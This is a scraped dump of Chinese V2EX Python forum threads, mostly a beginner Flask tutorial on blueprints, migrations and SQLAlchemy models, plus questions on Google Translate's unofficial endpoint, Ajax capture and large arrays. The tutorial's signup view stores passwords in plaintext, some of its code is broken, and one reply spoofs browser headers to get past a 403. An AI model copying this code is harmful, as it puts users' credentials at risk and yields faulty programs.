page!&lt;/h1&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>之后会讲解模板的具体用法，现在接着来定义 <a href=\"http://errors.py\" rel=\"nofollow\">errors.py</a>:</p>\n<blockquote>\n<p>app/main/<a href=\"http://errors.py\" rel=\"nofollow\">errors.py</a></p>\n</blockquote>\n<pre><code>from flask import render_template\nfrom . import main\n\n@main.app_errorhandler(404)\ndef page_not_found(e):    \n    return render_template('404.html'), 404\n</code></pre>\n<p>上面的步骤是让程序的路由保存在 <a href=\"http://views.py\" rel=\"nofollow\">views.py</a> 中，而错误处理交给 <a href=\"http://errors.py\" rel=\"nofollow\">errors.py</a> ，这两个模块已经和蓝本 main 关联起来了（在蓝本中导入了这两个模块），现在需要在工厂函数中注册蓝本 main 。将如下代码加入到上面缺省代码中即可：</p>\n<blockquote>\n<p>app/<a href=\"http://__init__.py\" rel=\"nofollow\">__init__.py</a></p>\n</blockquote>\n<pre><code>def create_app(config_name):\n    #...\n    from .main import main as main_blueprint\n    app.register_blueprint(main_blueprint)\n    return app\n</code></pre>\n<p>最后两个步骤是创建 requirements.txt 以及启动脚本 <a href=\"http://manage.py\" rel=\"nofollow\">manage.py</a> 。程序中必须包含一个 requirements.txt 文件，用于记录所有的依赖包和版本号，便于在其它电脑上创建相同的开发环境。直接在终端使用如下命令即可创建 requirements.txt 文件：</p>\n<pre><code>pip freeze &gt; requirements.txt\n</code></pre>\n<p>以后安装了新的依赖包或者升级版本后，重新执行该命令即可更新 requirements.txt 文件。如果要手动添加也可以，在 PyCharm 中用 Command + , 唤出 Preferences 对话框，然后选择 Project -&gt; Project Interpreter 即可查看所有的依赖包及其版本号（还有最新版本号提示），如图：</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-2519f815e5934d45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>如果要在另一台电脑上创建这个虚拟环境的完全副本，运行以下命令即可：</p>\n<pre><code>pip install -r requirements.txt\n</code></pre>\n<p>最后创建启动脚本 <a href=\"http://manage.py\" rel=\"nofollow\">manage.py</a> ：</p>\n<blockquote>\n<p><a href=\"http://manage.py\" rel=\"nofollow\">manage.py</a></p>\n</blockquote>\n<pre><code>import os\nfrom app import create_app, db\nfrom flask_script import Manager, Shell\nfrom flask_migrate import Migrate, MigrateCommand\n\napp = create_app(os.getenv('FLASK_CONFIG') or 'default')\nmanager = Manager(app)\nmigrate = Migrate(app, db)\n\ndef make_shell_context():    \n    return dict(app=app, db=db)\n    manager.add_command(\"shell\",Shell(make_context=make_shell_context))\n    manager.add_command('db', MigrateCommand)\n\nif __name__ == '__main__':    \n    manager.run()\n</code></pre>\n<p>这个脚本首先创建程序，然后增加了两个命令： shell 和 db ，我们之后可以在命令行中直接使用。</p>\n<p>到此为止，我们的目录结构如下：</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-d70859146f1cb5ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<h2>运行</h2>\n<p>现在就来启动我们的程序，在命令行中进入 TestProject 目录，然后执行如下命令即可运行：</p>\n<pre><code>python manage.py runserver\n</code></pre>\n<p>命令行运行截图如下：</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-2edf40b2ec3b12b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>Flask 默认的本机地址为： http://127.0.0.1:5000/ ，现在用浏览器打开这个地址，应该可以看到如下页面：</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-917907dd42367531.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<h2>到这一步，我们的第一个 Flask 程序已经完成了！虽然还没有建立数据库，页面也非常糟糕，但是之后我们会一步步进行完善！\n本文参考书籍 Flask Web 开发：基于 Python 的 Web 应用开发实战（作者: Miguel Grinberg)</h2>\n<blockquote>\n<p>作者： KenChoi - 极光（ JPush 为极光团队账号，欢迎关注）</p>\n</blockquote>\n<blockquote>\n<p>原文：<a href=\"http://www.jianshu.com/p/cc90a14856c5\" rel=\"nofollow\">从零开始用 Flask 搭建一个网站（一）</a></p>\n</blockquote>\n<blockquote>\n<p>知乎专栏：<a href=\"https://zhuanlan.zhihu.com/jiguang-daily\" rel=\"nofollow\">极光日报</a></p>\n</blockquote>\n</div></div>"], "reply": "9", "tittle": "从零开始用 Flask 搭建一个网站（一）", "comment": ["赞一个，是最基础的也是最重要的", "给作者点赞， 去年瞎摸做完一个网站。 感觉 Flask 效果不太好， 太繁琐。 不过是入门的好工具，够简单。", "其实 pycharm 里面就可以创建 VIRTUALENV 。\r", "自己搭的 VIRTUALEnv 在 pyharm 无法高亮和自动补全。感觉有点诡异。\r", "难道使用的姿势不对？", " 需要要在 Project Interpreter 识别出虚拟环境的解释器，才可以实现你提到的功能", "这不就是那本狗书的例子吗？", "这种文章一搜一大把 有必要发这么", "目前在看狗书，总有一点奇怪的小问题，正好需要这种类似他人的笔记", " 因为你比较厉害  所以你并不是这篇文章的受众", " 看标题我就觉得敢在 V2EX 写基础教程的，那可是真正的猛士，敢于直面莫名其妙的喷子"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有人对京东的算法大赛感兴趣么，小弟写了一个 start-code</p>\n<p>知乎： <a href=\"https://zhuanlan.zhihu.com/p/26177617\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/26177617</a></p>\n<p>github ： <a href=\"https://github.com/foursking1/jd\" rel=\"nofollow\">https://github.com/foursking1/jd</a></p>\n</div></div>"], "reply": "6", "tittle": "京东算法大赛 start-code", "comment": ["天奇造福人类", "的确哦！", "厉害呢", "厉害了", "没数据分享怎么玩？", "数据报名比赛之后可以下载"]},
{"content": ["<div class=\"topic_content\">我现在有一个需求：获取页面中发出去的 Ajax 请求，需要知道这些请求的 url 地址。现在的做法是手工的方式，在 Chrome 浏览器中打开页面，然后通过开发者工具打开 Network ，查看所有的 XHR 请求，然后把请求的地址复制下来。现在需要把上述手工方式转换为程序自动抓取的方式，有没有什么好的方法，是不是需要模拟浏览器环境去执行页面的 js ，还是怎样？谢谢了。</div>"], "reply": "1", "tittle": "如何使用 Python 获取到页面的 Ajax 请求", "comment": ["有人知道吗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h4>点击 case 运行结果无法跳转到具体的 case 代码</h4>\n<p>直接定位到 test case 的类，无法定位到具体的方法，我的 case 是继承 <code>unittest.TestCase</code> 类，使用 nose 驱动，更新之前都是可以的</p>\n<h4>无法始终展开运行结果，每次都要点击一下 <code>EXpand All</code></h4>\n<p><img alt=\"\" src=\"http://ww3.sinaimg.cn/large/006HJ39wgy1feiqtuhleaj30im07g0tn.jpg\"></p>\n<h4>运行结果无法裁剪，只能一直从根节点显示下去</h4>\n<p>貌似新的 test runner 是基于模块的，之前是基于当前文件的\n<img alt=\"\" src=\"http://ww1.sinaimg.cn/large/006HJ39wgy1feir47jleuj30n40bc0u0.jpg\"></p>\n<p>运行记录：</p>\n<pre><code>Launching Nosetest with arguments /Applications/PyCharm CE.app/Contents/helpers/pycharm/_jb_nosetest_runner.py xplatform_test.cases.xpc.public_account_api_test:PublicAccountApiTest -c nose.cfg\n</code></pre>\n<p>话说也没见有啥新特性，改的还比较别扭了。是不是我使用姿势有什么问题</p>\n</div></div>"], "reply": "1", "tittle": "大家有没有觉得 PyCharm 2017.1 test runner 改的有点奇怪了", "comment": ["而且觉得 搜索也变得比以前难用。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>正在看《集体智慧编程》的第二章，文章中的数据集太小，最近两天爬取了<strong>豆瓣 TOP250 电影的影评数据，大约 28 万条</strong>。最近的目标是分析这些数据，学习推荐系统算法。</p>\n<p>目前打算用的资料有：</p>\n<ol>\n<li>\n<p>gitbook 上的 <a href=\"https://wizardforcel.gitbooks.io/guide-to-data-mining/content/2.html\" rel=\"nofollow\">https://wizardforcel.gitbooks.io/guide-to-data-mining/content/2.html</a>\n感谢作者和译者</p>\n</li>\n<li>\n<p>《集体智慧编程》</p>\n</li>\n</ol>\n<p>请问 V 友有珍藏的学习资料么？能推荐一下么？先谢啦</p>\n<p>注：</p>\n<p><a href=\"http://www.jianshu.com/p/020cff24198a\" rel=\"nofollow\">豆瓣 TOP250 电影分析</a></p>\n<p><a href=\"http://www.jianshu.com/p/07f0d5a44f64\" rel=\"nofollow\">从推荐系统开始学习机器学习（预告）</a></p>\n<p>顺便提一下，爬虫系列的正则表达式部分更新了，近期不会更新爬虫系列，以后会把坑填完。本不喜欢玩爬虫，只是为了获取数据方便而学爬虫的。<a href=\"http://www.jianshu.com/p/b3bc88ffb251\" rel=\"nofollow\">爬虫中的正则表达式（持续更新）</a></p>\n</div></div>"], "reply": "11", "tittle": "开启机器学习之旅，请大 V 多多指导", "comment": ["上 kaggle 上看，随随便便几千万数据集", " 谢谢推荐！", "我是想学但是还没开始，不过一直有关注相关的学习资源， ", " 这个链接不错，而且这个网站基本是机器学习深度学习相关的，可以关注下，我自己也要抽点时间开始了，不能再拖延了。", " 谢谢啦，不要拖，撸起袖子就是干", "楼主是学生吗", " 暂时是的，只不过马上要毕业了", " 我大二的，机器学习推荐 cs229 ，深度学习 cs231n ，这两门课都有视频教案与练习，挺不错的", " 好的，谢谢推荐哈，我去看看，：）", "2017 年 4 月 11 日 08:38:50 ： 31 人收藏， 8 回复，这。。是不是相差有点大。。", " 我只收藏是因为想学 ml ，不回复是因为我不懂 ml 。。现在回复是想让你们知道不少人和我一样。。", " 嗯，其实我也不太懂，正在慢慢学"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>谷歌翻译是比较好用的服务，可是大部分时间我们都上不去，在 stackflow 看到一个地址可以使用，在浏览器上输入\n'<a href=\"https://translate.googleapis.com/translate_a/single?client=gtx&amp;sl=en&amp;tl=zh&amp;dt=t&amp;q=Hello'%E8%BF%94%E5%9B%9E%E4%BA%86%E4%B8%80%E4%B8%AA\" rel=\"nofollow\">https://translate.googleapis.com/translate_a/single?client=gtx&amp;sl=en&amp;tl=zh&amp;dt=t&amp;q=Hello'返回了一个</a> f.txt 。\n打开文件，翻译的结果就在一个很怪格式里面：[[[\"你好\",\"Hello\",null,null,1]],null,\"en\"]如果把 hello 替换成其他句子，返回的也是对应的结果。 sl=‘源语言’， tl=‘翻译语言’\n我的问题是，想利用这个‘接口’，用 python 做一个 txt 文件翻译小工具，但是以上的网页我用 urlopen 打不开，抛出 HTTPError: HTTP Error 403: Forbidden ，请问各位 v2er 利用什么模块获得返回的文本呢？如果来进行编写呢？</p>\n</div></div>", "<div class=\"topic_content\">import requests\r<br>\r<br>filesource = open('c:\\\\source.txt')\r<br>\r<br>for line in filesource:\r<br>    \r<br>\r<br>    \r<br>    url = '<a target=\"_blank\" href=\"https://translate.googleapis.com/translate_a/single?client=gtx&amp;sl=en&amp;tl=zh&amp;dt=t&amp;q='+line\" rel=\"nofollow\">https://translate.googleapis.com/translate_a/single?client=gtx&amp;sl=en&amp;tl=zh&amp;dt=t&amp;q='+line</a>\r<br>    r = requests.get(url)\r<br>    r= r.text\r<br>    \r<br>    \r<br>    aa =r. split(',')\r<br>\r<br>    print aa[0][4:-1],\r<br>    print aa[1][:-1]</div>"], "reply": "10", "tittle": "谷歌翻译的一个可用网页接口", "comment": ["应该是验证了 UA 的。。", "国内可以直接打开\r", "翻译服务 ", "google cloud platform 上面有正经翻译 api 可用，收费", "可以参考一下这个：\r", " 试试这个", ">>> import requests\r", ">>> url = '", "'\r", ">>> r = requests.get(url)\r", ">>> print(r.text)\r", "[[[\"你好，世界\",\"Hello world\",null,null,1]],null,\"en\"]\r", ">>>", "有道，扇贝都有 API ，扇贝还有读音", " 其实我们就是为了从围城里出去。", "# -*- coding: UTF-8 -*-\r", "\r", "\"\"\"\r", ":yunkchen\r", ":translate.py\r", ":2017/4/10 0010 下午 1:52\r", "\"\"\"\r", "import requests\r", "import sys\r", "reload(sys)\r", "sys.setdefaultencoding('utf-8')\r", "en2zh_url = \"https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=zh&dt=t&q=\"\r", "zh2en_url = \"https://translate.googleapis.com/translate_a/single?client=gtx&sl=zh&tl=en&dt=t&q=\"\r", "headers = { \"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\r", "        \"Accept-Encoding\":\"gzip, deflate, sdch, br\",\r", "        \"Accept-Language\":\"zh-CN,zh;q=0.8\",\r", "        \"User-Agent\":\"Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1\",\r", "        \"Referer\": \"http://wap.baidu.com\"\r", "        }\r", "\r", "\r", "def translate(word):\r", "    word = word.decode(\"utf-8\")\r", "    if word >= u'\\u4e00' and word<=u'\\u9fa5':\r", "        response = requests.get(zh2en_url+word, timeout=60, headers=headers)\r", "        ch = response.content.split(\"\\\"\")[1]\r", "        print(ch)\r", "    else:\r", "        response = requests.get(en2zh_url+word, timeout=60, headers=headers)\r", "        ch = response.content.split(\"\\\"\")[1]\r", "        print(ch)\r", "\r", "while True:\r", "    word = raw_input(\"Please input word:\")\r", "    translate(word)", "requests 的 response 里其实有 json 数据！\r", "\r", "不够钱帖源码， 参看 ", " 的 googleapis_translate.py （ Python 3.4 Win7 ）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://www.v2ex.com/t/353793#reply8\" rel=\"nofollow\">从零开始用 Flask 搭建一个网站（一）</a> 介绍了如何搭建 Python 环境，以及 Flask 应用基本项目结构。我们要搭建的网站是管理第三方集成的控制台，类似于 <a href=\"https://slack.com/\" rel=\"nofollow\">Slack</a>。 本篇主要讲解数据如何在 Flask 应用中流动，其它的框架基本上也是大同小异。</p>\n<h2>数据库</h2>\n<p>既然是数据的流动，首先要建立起存取数据的地方，也就是数据库了（这里是指关系型数据库， NoSQL 不在这讨论）。第一节中我们使用了 Flask-SQLAlchemy 管理数据库，在 Flask-SQLAlchemy 中，数据库使用 URL 指定，最流行的数据库 URL 格式如下：</p>\n<p>|数据库引擎|URL|\n|:-|:-|\n|MySQL|mysql://username:password@hostname/database|\n|Postgres|postgresql://username:password@hostname/database|\n|SQLite(Unix)|sqlite:////absolute/path/to/database|\n|SQLite(Windows)|sqlite:///c:/absolute/path/to/database|</p>\n<p>在 <a href=\"http://config.py\" rel=\"nofollow\">config.py</a> 中我们已经指定了数据库 URL ，如果使用云平台部署程序，直接将生成的数据库 URL 写到 <a href=\"http://config.py\" rel=\"nofollow\">config.py</a> 中 SQLALCHEMY_DATABASE_URI 即可。这里我们使用的是 SQLite 数据库。 Flask-SQLAlchemy 采用数据库抽象层来操作数据库，也称为对象关系映射（ Object-Relational Mapper, ORM ），在用户不知不觉的情况下把高层的面向对象操作转换成低层的数据库指令，因此易用性好。我们已经在 app/<a href=\"http://__init__.py\" rel=\"nofollow\">__init__.py</a> 中实例化了 SQLAlchemy 类：</p>\n<blockquote>\n<p>app/<a href=\"http://__init__.py\" rel=\"nofollow\">__init__.py</a></p>\n</blockquote>\n<pre><code>from flask_sqlalchemy import SQLAlchemy\n...\ndb = SQLAlchemy()\n...\n</code></pre>\n<h5>定义模型</h5>\n<p>模型类可以理解为数据库中的一张表， Flask-SQLAlchemy 提供了一个基类和一系列辅助类和函数来让我们定义模型的结构。我们直接在 app 文件夹下创建一个 <a href=\"http://models.py\" rel=\"nofollow\">models.py</a> 文件。鉴于每个网站需求都不一样，所存的数据也不同，但本质上是大同小异的。这里以笔者网站需求为例，需要创建 Developer ， Integration 和 Channel 三个表。</p>\n<blockquote>\n<p>app/<a href=\"http://models.py\" rel=\"nofollow\">models.py</a> 部分代码</p>\n</blockquote>\n<pre><code>from flask import current_app\nfrom app import db\n\nclass Developer(db.Model):    \n    __tablename__ = 'developers'    \n    id = db.Column(db.Integer, primary_key=True)    \n    dev_key = db.Column(db.String(40), unique=True, index=True)    \n    platform = db.Column(db.String(50))    \n    platform_id = db.Column(db.String(40), unique=True)    \n    username = db.Column(db.String(150), index=True)    \n    integrations = db.relationship('Integration', backref='developer')    \n    channels = db.relationship('Channel', backref='developer')\n\nclass Integration(db.Model):    \n    __tablename__ = 'integrations'    \n    id = db.Column(db.Integer, primary_key=True)    \n    integration_id = db.Column(db.String(40), unique=True)    \n    name = db.Column(db.String(100))    \n    description = db.Column(db.String(150))    \n    icon = db.Column(db.String(150))    \n    channel = db.Column(db.String(150))    \n    token = db.Column(db.String(150))    \n    developer_id = db.Column(db.Integer, db.ForeignKey('developers.id'))\n\nclass Channel(db.Model):    \n    __tablename__ = 'channels'    \n    id = db.Column(db.Integer, primary_key=True)    \n    developer_id = db.Column(db.Integer, db.ForeignKey('developers.id'))    \n    channel = db.Column(db.String(150))    \n  \n    def __repr__(self):        \n        return '&lt;Channel %r&gt;' % self.channel\n</code></pre>\n<p>上面的每个 Class 都继承了 Model 类，因此每个类在数据库中都体现为一张表，表名用 __tablename__ 表示，一般用复数形式。这里主要讲一下一对多的关系。可以看到上面 Developer 和 Integration 及 Channel 都有一个一对多的关系，一个用户可以有多个集成及多个频道。 看到这两句：</p>\n<pre><code>integrations = db.relationship('Integration', backref='developer')\ndeveloper_id = db.Column(db.Integer, db.ForeignKey('developers.id'))\n</code></pre>\n<p>第一句表明添加到 Developer 表的 integrations 属性表示这个关系的面向对象视角，对于一个 Developer 实例， integrations 属性将返回与 Developer 相关的所有 Integration ， db.relationship() 第一个参数表明关系的另一端是哪个模型， backref 参数向 Integration 添加一个 developer 属性，从而定义反向关系。第二句是在 Integration 表中创建一个 developer_id 字段，这个字段被定义为外键，就是这个外键建立起了关系。传给 db.ForeignKey() 的参数 '<a href=\"http://developers.id\" rel=\"nofollow\">developers.id</a>' 表明这列的值是 developers 表中行的 id 值。另外，__repr__() 方法返回一个具有可读性的字符串表示模型，可以在调试和测试时使用。下面我们就在命令行中操作一下数据库。\n首先执行：</p>\n<pre><code>//创建 migrations 文件夹及相关文件\npython manage.py db init\n</code></pre>\n<p>然后执行 ：</p>\n<pre><code>//自动创建迁移脚本\npython manage.py db migrate\n//创建数据表或者升级到最新版本\npython manage.py db upgrade\n</code></pre>\n<p>以后模型类有改动，比如删除或添加列，都要执行这两个命令，更新数据库表。现在在项目目录下应该自动生成了名为 dev 的数据库。\n接下来执行如下命令进入 Python Shell ：</p>\n<pre><code>python manage.py shell\n</code></pre>\n<h5>创建表</h5>\n<p>使用 db.create_all() 就可以根据模型类创建表。如图：</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-eadd21fb31b7d5f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>使用 db.drop_all() 方法就可以删除所有的表，但是这种方式比较粗暴，所有的数据也一同销毁了。</p>\n<h5>插入行</h5>\n<p>以下命令在数据库表中插入了一条数据：</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-e3c7b903c556755a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>通过数据库会话 db.session 来管理对数据库所做的改动，在准备把对象写入数据库之前，首先要添加到会话中，然后用 commit() 方法提交会话。接下来我们继续插入一条 Integration 数据：</p>\n<pre><code>&gt;&gt;&gt;from app.models import Integration,Channel\n&gt;&gt;&gt;integration = Integration(integration_id='i0001',name='github',description='first &gt;&gt;&gt;application',channel='github_event',developer=developer)\n&gt;&gt;&gt; db.session.add(integration)\n&gt;&gt;&gt; db.session.commit()\n</code></pre>\n<p>注意上面的 developer 属性，正是我们在 <a href=\"http://models.py\" rel=\"nofollow\">models.py</a> 中 Developer 模型中定义的一对多关系 integrations 属性的 backref 值， 所谓的反向关系即指在 Integration 表中每条数据都有一个 developer 属性指向 Developer 表中的某条数据，这是一对多关系的高级表示。现在可以用 developer.integrations 来查看该 developer 拥有的哪些集成，运行截图如下：</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-f7f16a428f2d87f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<h5>修改行</h5>\n<p>在提交数据库会话之前，改变对象的某个属性然后再提交即可更新行数据。如：</p>\n<pre><code>&gt;&gt;&gt; developer.username = 'lisi'\n&gt;&gt;&gt; db.session.add(developer)\n&gt;&gt;&gt; db.session.commit()\n</code></pre>\n<p>运行截图：\n<img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-e032e229766fc8f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<h5>删除行</h5>\n<p>调用 db.session.delete() 方法即可删除行：</p>\n<pre><code>&gt;&gt;&gt;db.session.delete(developer)\n&gt;&gt;&gt;db.session.commit()\n</code></pre>\n<h5>查询行</h5>\n<p>Flask-SQLAlchemy 为每个模型提供了 query 对象，最基本的查询是返回表中的所有记录：</p>\n<pre><code>&gt;&gt;&gt;Developer.query.all()\n</code></pre>\n<p>使用过滤器可以进行更精确的查询：</p>\n<pre><code>&gt;&gt;&gt;Developer.query.filter_by(platform='qq').all()\n</code></pre>\n<p>如果你退出了 shell 会话，前面创建的对象就不会以 Python 对象的形式存在，而是作为各自数据库表中的行。这时需要重数据库中读取行，再重新创建 Python 对象，如：</p>\n<pre><code>&gt;&gt;&gt; new_developer = Developer.query.filter_by(dev_key=12345).first()\n</code></pre>\n<p>注意上面的 first() 方法，如果不加上，将返回一个 BaseQuery 对象，这样就不能直接用 new_developer 来访问它的属性值。</p>\n<h3>在视图函数中操作数据库</h3>\n<p>上面介绍的所有数据库操作可以直接在视图函数中进行。假设我们要做一个简陋的注册功能，下面我们就来看看如何从网页中获取数据并保存在数据库中。我们先定义一个用户模型：</p>\n<blockquote>\n<p>app/<a href=\"http://models.py\" rel=\"nofollow\">models.py</a></p>\n</blockquote>\n<pre><code>class User(db.model):\n    __tablename__ = 'users'\n    id = db.column(db.Integer, primary_key=True)\n    username = db.column(db.String(50), unique=True)\n    password = db.column(db.String(100))\n\n    def __repr__(self):\n        return '&lt;User %r&gt;'  % self.username\n</code></pre>\n<p>然后在 main 文件夹下创建一个 <a href=\"http://forms.py\" rel=\"nofollow\">forms.py</a> 文件。</p>\n<blockquote>\n<p>app/main/<a href=\"http://forms.py\" rel=\"nofollow\">forms.py</a></p>\n</blockquote>\n<pre><code>from flask_wtf import Form\nfrom wtforms import StringField, SubmitField, PasswordField\nfrom wtforms.validators import DataRequired\n\nclass UserForm(Form):      \n    username = StringField('Input your username', validators=[DataRequired()])    \n    password = PasswordField('Input your password', validators=[DataRequired()])    \n    submit = SubmitField('Submit')\n</code></pre>\n<p>我们使用了 flask-wtf 扩展（ pip install flask-wtf ）来处理表单。\n然后我们用在 index 页面中显示这个表单。</p>\n<blockquote>\n<p>index.html</p>\n</blockquote>\n<pre><code>{% extends \"bootstrap/base.html\" %}\n{% import \"bootstrap/wtf.html\" as wtf %}\n\n{% block title %}注册{% endblock %}\n\n{% block content %}\n    {% for message in get_flashed_messages() %}    \n        &lt;div class=\"alert alert-warning\"&gt;        \n            &lt;button type=\"button\" class=\"close\" data-dismiss=\"alert\"&gt;×&lt;/button&gt;        \n            {{ message }}    \n        &lt;/div&gt;\n    {% endfor %}\n    &lt;div id=\"form\"&gt;\n        &lt;div class=\"col-md-4\"&gt;\n            {{ wtf.quick_form(form) }}\n        &lt;/div&gt;\n    &lt;/div&gt;\n{% endblock %}\n</code></pre>\n<p>现在回到 <a href=\"http://views.py\" rel=\"nofollow\">views.py</a> 中，在我们的视图函数中作如下改动：</p>\n<blockquote>\n<p>app/main/<a href=\"http://views.py\" rel=\"nofollow\">views.py</a></p>\n</blockquote>\n<pre><code>...\nfrom .forms import UserForm\nfrom ..models import User\nfrom app import db\n\n\n@main.route('/', methods=['GET', 'POST'])\ndef signin()：\n    form = UserForm()\n    if form is None:\n        flash('Should input username and password')\n    elif  form.validate_on_submit():\n        user = User(username=form.username.data, password=form.password.data)\n        db.session.add(user)\n        try:\n            db.session.commit()\n            flash('User created !')\n        except:\n            db.session.rollback()\n            flash('User create failed')\n    return render_template('index.html', form=form)\n</code></pre>\n<p>接下来我们运行一下这个小试验：</p>\n<pre><code>python manage.py runserver\n</code></pre>\n<h2>总结</h2>\n<p>本节我们介绍了在 Flask 中是如何使用 Flask-SQLAlchemy 、 Flask-Migrate 来管理数据库，并且示范了数据从网页储存到数据库的过程，这只是最基础的部分，下一节我们将探索如何在网页上发送请求并且得到数据，以及如何在页面之间传递数据。</p>\n<hr>\n<blockquote>\n<p>作者： KenChoi - 极光（ JPush 为极光团队账号，欢迎关注）</p>\n</blockquote>\n<blockquote>\n<p>原文：<a href=\"http://www.jianshu.com/p/940202e674da\" rel=\"nofollow\">从零开始用 Flask 搭建一个网站（二）</a></p>\n</blockquote>\n<blockquote>\n<p>知乎专栏：<a href=\"https://zhuanlan.zhihu.com/jiguang-daily\" rel=\"nofollow\">极光日报</a></p>\n</blockquote>\n</div></div>"], "reply": "目前尚无回", "tittle": "从零开始用 Flask 搭建一个网站（二）", "comment": []},
{"content": ["<div class=\"topic_content\">字符串是 python 中最常用的一种数据类型，字符串的拼接方法有很多种，这里将通过例子来详细讲解这几方法的使用及各自的特点。\r<br>&gt;&gt;&gt; a = 'hello'\r<br>&gt;&gt;&gt; b = 'python'\r<br>&gt;&gt;&gt; c = '!'\r<br>&gt;&gt;&gt; a + ' ' + b + ' ' + c\r<br>'hello python !'\r<br>&gt;&gt;&gt; ' '.join([a,b,c])\r<br>'hello python !'\r<br>&gt;&gt;&gt; '%s %s,I love %s %s' % (a,b,b,c)\r<br>'hello python,I love python !'\r<br>&gt;&gt;&gt; '{} {} {}'.format(a,b,c)\r<br>'hello python !' \r<br>&gt;&gt;&gt; '{1} {2} {0}'.format(a,b,c)\r<br>'python ! hello'\r<br>&gt;&gt;&gt; '{x1} {x2} {x3}'.format(x1=a,x2=b,x3=c)\r<br>'hello python !'\r<br>&gt;&gt;&gt; \r<br>先创建了 a ， b ， c 三个字符串对象，通过上面的例子来归纳这几种字符串连接方式的特点。\r<br>第一种方法是用“+”连接，这里要注意的是两个字符串是直接相连的，如果是连成一句话，单词之间要有个空格，那么就得自己将空格加上。\r<br>第二种方法是用.join()的方式，要注意的是这种方法括号里面只能是一个对象，可以把多个对象放到一个列表或元祖里面后再使用这种方法，而这个列表或元组里面的元素必须是字符串类型的。同时前面引号里字符相当于是连接点，可以在里面写连接点的字符，例如空格。这种方法也相当于是.split 方法的反操作。\r<br>例：\r<br>&gt;&gt;&gt; '*'.join([a,b,c])\r<br>'hello*python*!'\r<br>&gt;&gt;&gt; 'xxx'.join([a,b,c])\r<br>'helloxxxpythonxxx!'\r<br>&gt;&gt;&gt; \r<br>第三种方法是用“%s ”字符串格式化的方式，%s 当占位符在前面的字符串中占一个位置，后面用百分号%来连接需要填进去的对象。一般在一长串字符串中添加某个变量就会使用这个方法。字符串的格式化除了%s 之外还有格式整数的%d ，格式化小数的%f 等。\r<br>第四种方法是.format()的方式。 format 方法和%s 的方法一样都是属于字符串的格式化的方法，只是在 format 方法中用的是大括号{}来当占位符。\r<br>'{}{}{}'.format(a,b,c)\r<br>当{}里面是空的时候，里面默认索引为 0 ， 1 ， 2 按 format 括号里的顺序依次填入。\r<br>'{1}{2}{0}'.format(a,b,c)\r<br>当{}里面有索引值时，按前面的索引值将后面的每项依次填入。\r<br>'{n1}{n2}{n3}'.format(n1=a,n2=b,n3=c)\r<br>大括号{}里面可以指定对象名称，后面通过赋值的方式给前面的相应的值，后面的对象是无序的。\r<br>\r<br>喜欢 python 或者想学习 python 的朋友可以加 QQ 群： 421994244 ！群内每天会更新 python 资料，还有大牛指导哟！</div>"], "reply": "目前尚无回", "tittle": "Python 字符串拼接方法详解", "comment": []},
{"content": ["<div class=\"topic_content\">各位大神，\r<br>\r<br>我现在需要构造一个 7 万*1 万大小的数组存储一些数据，\r<br>我的大概写法是：\r<br>T=[]\r<br>for i in range(70000):\r<br>－－t = [0 for col in range(10000)]\r<br>－－t[col]=f(i) //根据 i 会修改 t 中的某些值\r<br>－－T.append(t)\r<br>\r<br>这样可以获得 T,但是巨慢。。。\r<br>电脑直接死机 T^T 。。卡了快一个小时运行完毕。。。\r<br>\r<br>求问有没有其他解决方法。。。</div>"], "reply": "19", "tittle": "小白求助：关于 Python 创建非常大的二维数组的几个问题", "comment": ["不负责任说一句 用 numpy 吧", "这么大个二维数组，就算用 c++的 vector 动态分配实现也是慢的可以吧，你可以试试 numpy 的矩阵来保存一下，主要应该是要一次性分配好内存，要不然这样递增式的分配，不慢才怪喽", "构建一个一维数组，然后写个函数做映射？", "假设你 t 里边存的是 32 位 int, 70000 * 10000 * 32 / (1 << 30) = 20G, 电脑内存够么?", "落了个 4, 5G, sorry", "我在想什么样的场景需要这样做\r", "真的有这样的数组要求最好还是放数据库中吧", "import numpy as np", "Dense or sparse?", " #4 Python 里的 int 占 28 字节", "pandas ＋ numpy 吧，注意内存消耗", " 求解一个有几万个约束的优化模型中的一个步骤，需要构造技术矩阵～　亲测ｎｕｍｐｙ可用", "非常感谢大家！\r", "ｎｕｍｐｙ直接生成一个全为零的相应规模的矩阵（因为我的矩阵大部分值是零），然后根据需要修改对应值就可以了！", "如果矩阵是稀疏的， sklearn 中有一些处理稀疏矩阵的算法。", " 这种情况用 scipy 的 sparse 创建稀疏矩阵会大大提高效率", " 嗷，好的我研究下～谢谢！", "试试 pypy", "MATLAB 。。。", "稀疏矩阵", "稀疏矩阵啊"]},
